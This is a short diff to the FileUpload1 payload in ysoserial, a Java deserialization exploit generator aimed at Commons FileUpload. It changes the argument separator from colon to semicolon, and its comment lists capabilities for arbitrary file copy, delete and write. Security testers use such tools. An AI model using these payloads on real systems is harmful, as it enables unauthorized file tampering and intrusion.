@@ -22,11 +22,11 @@ import ysoserial.payloads.util.Reflections;
  * DiskFileItem.readObject()
  * 
  * Arguments:
- * - copyAndDelete:sourceFile:destDir
- * - write:destDir:ascii-data
- * - writeB64:destDir:base64-data
- * - writeOld:destFile:ascii-data
- * - writeOldB64:destFile:base64-data
+ * - copyAndDelete;sourceFile;destDir
+ * - write;destDir;ascii-data
+ * - writeB64;destDir;base64-data
+ * - writeOld;destFile;ascii-data
+ * - writeOldB64;destFile;base64-data
  * 
  * Yields:
  * - copy an arbitraty file to an arbitrary directory (source file is deleted if possible)
@@ -44,7 +44,7 @@ public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {
 
     public DiskFileItem getObject ( String command ) throws Exception {
 
-        String[] parts = command.split(":");
+        String[] parts = command.split(";");
 
         if ( parts.length == 3 && "copyAndDelete".equals(parts[ 0 ]) ) {
             return copyAndDelete(parts[ 1 ], parts[ 2 ]);
